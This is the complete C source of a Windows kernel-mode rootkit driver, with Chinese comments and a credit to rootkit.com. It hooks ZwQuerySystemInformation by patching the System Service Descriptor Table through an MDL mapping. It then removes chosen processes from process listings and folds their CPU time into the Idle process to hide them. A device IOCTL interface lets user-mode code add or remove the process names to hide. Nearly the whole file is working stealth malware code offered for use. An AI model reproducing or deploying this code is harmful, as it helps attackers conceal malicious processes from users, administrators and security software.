#include "ntddk.h"

#pragma pack(1)
typedef struct ServiceDescriptorEntry
{
	unsigned int *ServiceTableBase;
	unsigned int *ServiceCounterTableBase;
	unsigned int NuberOfServices;
	unsigned char *ParamTableBase;
} ServiceDescriptorTableEntry_t, *PServiceDescriptorTableEntry_t;
#pragma pack()

__declspec(dllimport) ServiceDescriptorTableEntry_t KeServiceDescriptorTable;
#define SYSCALL_INDEX(_function) (*(PULONG)((PUCHAR)_function+1))
#define SYSTEMSERVICE(_function) KeServiceDescriptorTable.ServiceTableBase[SYSCALL_INDEX(_function)]

PMDL g_pmdlSystemCall = NULL;
PVOID* MappedSystemCallTable = NULL;

#define HOOK_SYSCALL(_function, _hook, _Orig) \
	_Orig = (PVOID)InterlockedExchange((PULONG)&MappedSystemCallTable[SYSCALL_INDEX(_function)], (LONG)_hook)
#define UNHOOK_SYSCALL(_Function, _Hook, _Orig )  \
       InterlockedExchange((PLONG)&MappedSystemCallTable[SYSCALL_INDEX(_Function)], (LONG)_Hook)
BOOLEAN IsHideProcessName(PUNICODE_STRING name);
NTSTATUS OnIoctl(PDEVICE_OBJECT pDevObj, PIRP pIrp);

#define FILE_DEVICE_HIDEPROCESS      0x8000
#define IOCTL_HIDEPROCESS_CLEAR_LIST      CTL_CODE(FILE_DEVICE_HIDEPROCESS, 0, METHOD_BUFFERED, FILE_ANY_ACCESS)
#define IOCTL_HIDEPROCESS_ADD_PROCESS    CTL_CODE(FILE_DEVICE_HIDEPROCESS, 1 , METHOD_BUFFERED, FILE_ANY_ACCESS)
#define IOCTL_HIDEPROCESS_DELETE_PROCESS    CTL_CODE(FILE_DEVICE_HIDEPROCESS, 2 , METHOD_BUFFERED, FILE_ANY_ACCESS)
#define IOCTL_HIDEPROCESS_ADD_PROCESS_LIST    CTL_CODE(FILE_DEVICE_HIDEPROCESS, 3 , METHOD_BUFFERED, FILE_ANY_ACCESS)
#define IOCTL_HIDEPROCESS_DELETE_PROCESS_LIST    CTL_CODE(FILE_DEVICE_HIDEPROCESS, 4, METHOD_BUFFERED, FILE_ANY_ACCESS)

struct _SYSTEM_THREADS
{
        LARGE_INTEGER           KernelTime;
        LARGE_INTEGER           UserTime;
        LARGE_INTEGER           CreateTime;
        ULONG                   WaitTime;
        PVOID                   StartAddress;
        CLIENT_ID               ClientIs;
        KPRIORITY               Priority;
        KPRIORITY               BasePriority;
        ULONG                   ContextSwitchCount;
        ULONG                   ThreadState;
        KWAIT_REASON            WaitReason;
};

struct _SYSTEM_PROCESSES
{
        ULONG                   NextEntryDelta;
        ULONG                   ThreadCount;
        ULONG                   Reserved[6];
        LARGE_INTEGER           CreateTime;
        LARGE_INTEGER           UserTime;
        LARGE_INTEGER           KernelTime;
        UNICODE_STRING          ProcessName;
        KPRIORITY               BasePriority;
        ULONG                   ProcessId;
        ULONG                   InheritedFromProcessId;
        ULONG                   HandleCount;
        ULONG                   Reserved2[2];
        VM_COUNTERS             VmCounters;
        IO_COUNTERS             IoCounters; //windows 2000 only
        struct _SYSTEM_THREADS  Threads[1];
};

// Added by Creative of rootkit.com
struct _SYSTEM_PROCESSOR_TIMES
{
		LARGE_INTEGER			IdleTime;
		LARGE_INTEGER			KernelTime;
		LARGE_INTEGER			UserTime;
		LARGE_INTEGER			DpcTime;
		LARGE_INTEGER			InterruptTime;
		ULONG					InterruptCount;
};

// 驱动内部名称和符号连接名称
#define DEVICE_NAME L"\\Device\\devHideProcess"
#define LINK_NAME L"\\??\\hideprocess"

//原始函数申明
NTSYSAPI NTSTATUS ZwQuerySystemInformation(IN ULONG SystemInformationClass, 
										   IN PVOID SystemInformation, 
										   IN ULONG SystemInformationLength, 
										   OUT PULONG ReturnLength);

//新函数申明
typedef NTSTATUS (*ZWQUERYSYSTEMINFORMATION)(IN ULONG SystemInformationClass, 
										     IN PVOID SystemInformation, 
										     IN ULONG SystemInformationLength, 
										     OUT PULONG ReturnLength);
//原始函数指针
ZWQUERYSYSTEMINFORMATION OldZwQuerySystemInformation;
//时间
LARGE_INTEGER  m_UserTime;    //被隐去的进程所占用的用户空间时间
LARGE_INTEGER  m_KernelTime;  //被隐去的进程所占用的内核空间时间

#define MAX_PROCESS_NAME_LEN 256
#define MAX_PROCESS_ARRAY_LEN 100

USHORT g_HideProcessName[MAX_PROCESS_ARRAY_LEN][MAX_PROCESS_NAME_LEN];
USHORT g_HideProcessNameLength[MAX_PROCESS_ARRAY_LEN];
USHORT g_ArraySize = 0;

struct GLOBAL{
	PDEVICE_OBJECT pControlDevice;	// 此驱动程序的控制设备对象指针
} g_data;

//判断是否是指定的要隐藏的进程名称
BOOLEAN IsHideProcessName(PUNICODE_STRING name)
{
	USHORT i;
	if (name == NULL || name->Buffer == NULL)
		return FALSE;
    if (g_ArraySize <= 0)
		return FALSE;
	for(i=0; i<g_ArraySize; i++)
	{
        USHORT* pName = g_HideProcessName[i];
		USHORT  len = g_HideProcessNameLength[i];
		if (0 == memcmp(name->Buffer, pName, len*sizeof(USHORT)))
			return TRUE;
	}

	return FALSE;
}

NTSTATUS NewZwQuerySystemInformation(IN ULONG SystemInformationClass, 
									 IN PVOID SystemInformation, 
									 IN ULONG SystemInformationLength, 
									 OUT PULONG ReturnLength)
{
	//调用原来的函数
   NTSTATUS ntStatus = ((ZWQUERYSYSTEMINFORMATION)OldZwQuerySystemInformation)(
	                                SystemInformationClass, SystemInformation, SystemInformationLength, ReturnLength);
   if (NT_SUCCESS(ntStatus))
   {
	   //如果是查询进程或文件列表， 或目录
	   if (SystemInformationClass == 5)
	   {
		   //SystemInformation存放的是原来函数查询到的进程列表
		   struct _SYSTEM_PROCESSES* curr = (struct _SYSTEM_PROCESSES*)SystemInformation;
		   struct _SYSTEM_PROCESSES* prev = NULL;
           //遍历进程列表
		   while(curr)
		   {
			   if (curr->ProcessName.Buffer != NULL)
			   {    
				   //如果进程文件名称制定字符串开头
				   //if (m_HideProcessNameLength > 0 && 0 == memcmp(curr->ProcessName.Buffer, m_HideProcessName, m_HideProcessNameLength*sizeof(USHORT)))
				   //if (0 == memcmp(curr->ProcessName.Buffer, L"Main", 8))
				   if (IsHideProcessName(&curr->ProcessName))
				   {
					   //将该进程的时间累加
				       m_UserTime.QuadPart += curr->UserTime.QuadPart;
				       m_KernelTime.QuadPart += curr->KernelTime.QuadPart;
                       //如果不是第一个进程
					   if (prev)
					   {
						   //如果进程列表的下一条不为空，将当前进程指向下一条指针府给上一个进程，跳过当前进程
						   if (curr->NextEntryDelta)
							   prev->NextEntryDelta += curr->NextEntryDelta;
						   else//如果进程列表的下一条为空，将上一个进程的指向下一条指针为空，跳过当前进程
                               prev->NextEntryDelta = 0;
					   }
					   else//如果是第一个进程
					   {
						   //如果进程列表的下一条不为空，将返回进程信息的指针指向下一条，跳过当前进程
						   if (curr->NextEntryDelta)
							   (char*)SystemInformation += curr->NextEntryDelta;
						   else//如果进程列表的下一条为空, 返回空进程信息缓冲
                               (char*)SystemInformation = NULL;
					   }
				   }
				   else
					   //保存上一个进程指针
					   prev = curr;
			   }
			   else//是Idle进程
			   {
				   //将被隐去进程的时间追加到Idle进程上
				   curr->UserTime.QuadPart += m_UserTime.QuadPart;
				   curr->KernelTime.QuadPart += m_KernelTime.QuadPart;
				   m_UserTime.QuadPart = 0;
				   m_KernelTime.QuadPart = 0;
				   //保存上一个进程指针
			       prev = curr;
			   }
			   
			   //下一个进程
			   if (curr->NextEntryDelta)
				   (char*)curr += curr->NextEntryDelta;
			   else
				   curr = NULL;
		   }
	   }
	   //查询系统处理器运行时间
	   else if (SystemInformationClass == 8)
	   {
		   struct _SYSTEM_PROCESSOR_TIMES* times = (struct _SYSTEM_PROCESSOR_TIMES*)SystemInformation;
		   times->IdleTime.QuadPart += m_UserTime.QuadPart + m_KernelTime.QuadPart;
	   }
   }
   return ntStatus;
}
//驱动程序卸载
VOID OnUnload(IN PDRIVER_OBJECT DriverObject)
{
	UNICODE_STRING SymbolicLink;
    //取消对QuerySystemInformation的挂钩
	UNHOOK_SYSCALL(ZwQuerySystemInformation, OldZwQuerySystemInformation, NewZwQuerySystemInformation);
    //if MDL != NULL
	if (g_pmdlSystemCall)
	{   //Unmap
		MmUnmapLockedPages(MappedSystemCallTable, g_pmdlSystemCall);
		//free
		IoFreeMdl(g_pmdlSystemCall);
	}
	// 删除设备对象
	if (g_data.pControlDevice != NULL)
		IoDeleteDevice(g_data.pControlDevice); 
	// 删除符号连接
	RtlInitUnicodeString(&SymbolicLink, LINK_NAME);
	IoDeleteSymbolicLink(&SymbolicLink);
}
// 处理IRP_MJ_CREATE、IRP_MJ_CLOSE功能代码
NTSTATUS OnCreateClose(PDEVICE_OBJECT pDevObj, PIRP pIrp)
{
	pIrp->IoStatus.Status = STATUS_SUCCESS;
	IoCompleteRequest(pIrp, IO_NO_INCREMENT);
	return STATUS_SUCCESS;
}
//入口函数
NTSTATUS DriverEntry(IN PDRIVER_OBJECT theDriverObject, IN PUNICODE_STRING theRegistryPath)
{
	UNICODE_STRING SymbolicLink;
	UNICODE_STRING DevName;
	NTSTATUS status;
	PDEVICE_OBJECT pDeviceObj = NULL;

	g_data.pControlDevice = NULL;
	memset(g_HideProcessName, 0, MAX_PROCESS_NAME_LEN * MAX_PROCESS_ARRAY_LEN * sizeof(USHORT));
    memset(g_HideProcessNameLength, 0, MAX_PROCESS_ARRAY_LEN * sizeof(USHORT));
    g_ArraySize = 0;
	//制定卸载函数
	theDriverObject->DriverUnload = OnUnload;
	theDriverObject->MajorFunction[IRP_MJ_CREATE] = OnCreateClose;
	theDriverObject->MajorFunction[IRP_MJ_CLOSE] = OnCreateClose;
	theDriverObject->MajorFunction[IRP_MJ_DEVICE_CONTROL] = OnIoctl;
	m_UserTime.QuadPart = m_KernelTime.QuadPart = 0;
	//保存原来的ZwQuerySystemInformation函数指针
	OldZwQuerySystemInformation = (ZWQUERYSYSTEMINFORMATION)(SYSTEMSERVICE(ZwQuerySystemInformation));
	
	RtlInitUnicodeString(&DevName, DEVICE_NAME);
	status = IoCreateDevice(theDriverObject, 0, &DevName,  FILE_DEVICE_UNKNOWN, 0, FALSE, &pDeviceObj);
	if(!NT_SUCCESS(status))
	{
		DbgPrint("CreateDevice failed \n");
	    return STATUS_UNSUCCESSFUL;
	}
	// 为上面的设备创建符号连接
	RtlInitUnicodeString(&SymbolicLink, LINK_NAME);
	status = IoCreateSymbolicLink(&SymbolicLink, &DevName);  
	if(!NT_SUCCESS(status))
	{
		DbgPrint("CreateSymbolicLink failed \n");
		IoDeleteDevice(pDeviceObj); 
		return STATUS_UNSUCCESSFUL;
	}
	//创建MDL
	g_pmdlSystemCall = MmCreateMdl(NULL, KeServiceDescriptorTable.ServiceTableBase, KeServiceDescriptorTable.NuberOfServices*4);
	if (g_pmdlSystemCall == NULL)
		return STATUS_UNSUCCESSFUL;
	
	g_data.pControlDevice = pDeviceObj;

	MmBuildMdlForNonPagedPool(g_pmdlSystemCall);
	//改变MDL的flag
	g_pmdlSystemCall->MdlFlags |= MDL_MAPPED_TO_SYSTEM_VA;
	//mapped to memory
	MappedSystemCallTable = MmMapLockedPages(g_pmdlSystemCall, KernelMode);
	//挂钩
	HOOK_SYSCALL(ZwQuerySystemInformation, NewZwQuerySystemInformation, OldZwQuerySystemInformation);
	return STATUS_SUCCESS;
}
//删除进程名称
BOOLEAN DeleteProcessName(USHORT* pName, USHORT Len)
{
	USHORT i;
	USHORT j;
	USHORT* pBuf, * pBuf2;
	USHORT nLen, nLen2;
    if (pName == NULL || Len <= 0)
		return FALSE;
	if (g_ArraySize <= 0)
		return FALSE;
	
	for(i=g_ArraySize-1; i>=0; i--)
	{
		pBuf = g_HideProcessName[i];
		nLen = g_HideProcessNameLength[i];
		if (nLen != Len)
			continue;
        if (0 != memcmp(pBuf, pName, sizeof(USHORT)*Len))
			continue;
        for(j=i; j<g_ArraySize-1; j++)
		{
            pBuf = g_HideProcessName[j];
			nLen = g_HideProcessNameLength[j];
			pBuf2 = g_HideProcessName[j+1];
			nLen2 = g_HideProcessNameLength[j+1];
			memset(pBuf, 0, nLen*sizeof(USHORT));
			memcpy(pBuf, pBuf2, nLen2*sizeof(USHORT));
			g_HideProcessNameLength[j] = g_HideProcessNameLength[j+1];
		}
		g_ArraySize --;
		return TRUE;
	}
	return FALSE;
}
//添加一个进程名称
BOOLEAN AddProcessName(USHORT* pBuffer, USHORT Len)
{
	if (g_ArraySize >= MAX_PROCESS_ARRAY_LEN)
		return FALSE;
	//memset(g_HideProcessNameLength[g_ArraySize], 0, MAX_PROCESS_NAME_LEN*sizeof(USHORT));
	memcpy(g_HideProcessName[g_ArraySize], pBuffer, sizeof(USHORT)*Len);
	g_HideProcessNameLength[g_ArraySize] = Len;
	g_ArraySize ++;
    return TRUE;	
}
// I/O控制派遣例程
NTSTATUS OnIoctl(PDEVICE_OBJECT pDevObj, PIRP pIrp)
{
	// 假设失败
	NTSTATUS status = STATUS_INVALID_DEVICE_REQUEST;
	// 取得此IRP（pIrp）的I/O堆栈指针
	PIO_STACK_LOCATION pStack = IoGetCurrentIrpStackLocation(pIrp);
	// 取得I/O控制代码
	ULONG uIoCode = pStack->Parameters.DeviceIoControl.IoControlCode;
    // 取得I/O缓冲区指针和它的长度
	PVOID pIoBuffer = pIrp->AssociatedIrp.SystemBuffer;
	ULONG uInSize = pStack->Parameters.DeviceIoControl.InputBufferLength;
	ULONG uOutSize = pStack->Parameters.DeviceIoControl.OutputBufferLength;

	if(uIoCode == IOCTL_HIDEPROCESS_CLEAR_LIST)
	{
		g_ArraySize = 0;
        pIrp->IoStatus.Information = 0;
		pIrp->IoStatus.Status = STATUS_SUCCESS;
		IoCompleteRequest(pIrp, IO_NO_INCREMENT);
		return STATUS_SUCCESS;
	}
	else if (uIoCode == IOCTL_HIDEPROCESS_ADD_PROCESS)
	{
		if (g_ArraySize >= MAX_PROCESS_ARRAY_LEN)
			status = STATUS_UNSUCCESSFUL;
		else
		{
			if (uInSize == 0)
                status = STATUS_UNSUCCESSFUL;
			else
			{
				USHORT Len = *(USHORT*)pIoBuffer;
				if (Len <= 0)
                    status = STATUS_UNSUCCESSFUL;
				else
				{
					if (uInSize < sizeof(USHORT)*(Len+1))
						status = STATUS_UNSUCCESSFUL;
					else
					{
						USHORT* pBuffer = (((USHORT*)pIoBuffer) + 1);
						AddProcessName(pBuffer, Len);
			            status = STATUS_SUCCESS;
					}
				}
			}
		}
		pIrp->IoStatus.Information = 0;
		pIrp->IoStatus.Status = status;
		IoCompleteRequest(pIrp, IO_NO_INCREMENT);
		return status;
	}
	else if (uIoCode == IOCTL_HIDEPROCESS_DELETE_PROCESS)
	{
		if (uInSize == 0)
			status = STATUS_UNSUCCESSFUL;
		else
		{
			USHORT Len = *(USHORT*)pIoBuffer;
			if (Len <= 0)
				status = STATUS_UNSUCCESSFUL;
			else
			{
				if (uInSize < sizeof(USHORT)*(Len+1))
					status = STATUS_UNSUCCESSFUL;
				else
				{
					USHORT* pBuffer = (((USHORT*)pIoBuffer) + 1);
					BOOLEAN bDeleted = DeleteProcessName(pBuffer, Len);
					if (bDeleted)
						status = STATUS_SUCCESS;
					else
                        status = STATUS_UNSUCCESSFUL;
				}
			}
		}
		pIrp->IoStatus.Information = 0;
		pIrp->IoStatus.Status = status;
		IoCompleteRequest(pIrp, IO_NO_INCREMENT);
		return status;
	}
	else if (uIoCode == IOCTL_HIDEPROCESS_ADD_PROCESS_LIST)
	{
		if (uInSize == 0)
			status = STATUS_UNSUCCESSFUL;
		else
		{
			ULONG nBufSize = uInSize;
			USHORT nCount = *(USHORT*)pIoBuffer;
			if (nCount <= 0)
				status = STATUS_UNSUCCESSFUL;
			else
			{
				if (g_ArraySize + nCount > MAX_PROCESS_ARRAY_LEN)
					status = STATUS_UNSUCCESSFUL;
				else
				{
					USHORT i;
					USHORT* pBuffer = (((USHORT*)pIoBuffer) + 1);

					nBufSize --;

					for(i=0; i<nCount; i++)
					{
                        USHORT nLen = *pBuffer;	
						pBuffer += 1;
						nBufSize -= 1;

						if (nBufSize < nLen)
						{
							status = STATUS_UNSUCCESSFUL;
							break;
						}

						if (!AddProcessName(pBuffer, nLen))
						{
                            status = STATUS_UNSUCCESSFUL;
							break;
						}
						pBuffer += nLen;
						nBufSize -= nLen;
					}
				}
			}
		}
		pIrp->IoStatus.Information = 0;
		pIrp->IoStatus.Status = status;
		IoCompleteRequest(pIrp, IO_NO_INCREMENT);
		return status;
	}
	else if (uIoCode == IOCTL_HIDEPROCESS_DELETE_PROCESS_LIST)
	{
		if (uInSize == 0)
			status = STATUS_UNSUCCESSFUL;
		else
		{
			ULONG nBufSize = uInSize;
			USHORT nCount = *(USHORT*)pIoBuffer;
			if (nCount <= 0)
				status = STATUS_UNSUCCESSFUL;
			else
			{
				USHORT i;
				USHORT* pBuffer = (((USHORT*)pIoBuffer) + 1);

				nBufSize --;

				for(i=0; i<nCount; i++)
				{
                    USHORT nLen = *pBuffer;	
					pBuffer += 1;
					nBufSize -= 1;

					if (nBufSize < nLen)
					{
						status = STATUS_UNSUCCESSFUL;
						break;
					}
					DeleteProcessName(pBuffer, nLen);
					pBuffer += nLen;
					nBufSize -= nLen;
				}
			}
		}
		pIrp->IoStatus.Information = 0;
		pIrp->IoStatus.Status = status;
		IoCompleteRequest(pIrp, IO_NO_INCREMENT);
		return status;
	}
	else
	{
		pIrp->IoStatus.Information = 0;
		pIrp->IoStatus.Status = status;
		IoCompleteRequest(pIrp, IO_NO_INCREMENT);
		return status;
	}
}

